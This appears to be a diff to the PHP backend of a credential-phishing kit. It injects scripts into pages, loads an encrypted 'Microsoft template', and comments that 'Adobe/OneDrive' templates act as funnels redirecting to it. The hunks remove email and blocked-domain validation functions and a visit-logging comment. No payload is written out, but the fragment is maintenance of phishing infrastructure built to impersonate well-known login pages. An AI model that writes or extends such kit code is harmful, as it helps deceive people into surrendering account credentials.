@@ -636,14 +636,6 @@ if (strpos($html, '// DOMAIN_INJECTION_POINT') !== false) {
             }
         })();
         
-        function validateEmailDomain(email) {
-            const domain = email.split("@")[1]?.toLowerCase();
-            return domain && !BLOCKED_DOMAINS.includes(domain);
-        }
-        
-        function validateEmail(email) {
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-        }
     ';
     
     $html = str_replace('// DOMAIN_INJECTION_POINT', $domainScript, $html);
@@ -660,8 +652,7 @@ if (strpos($html, '{{BG_URL}}') !== false) {
     $html = str_replace('{{BG_URL}}', $safeBg, $html);
 }
 
-// Log Visit
-// Unified Source of Truth: Only log visits when the main Microsoft template is loaded.
+
 // Other templates (Adobe/OneDrive) act as funnels and will redirect here.
 $isMainTemplate = ($templateFile === __DIR__ . '/templates/template.html.enc');
 
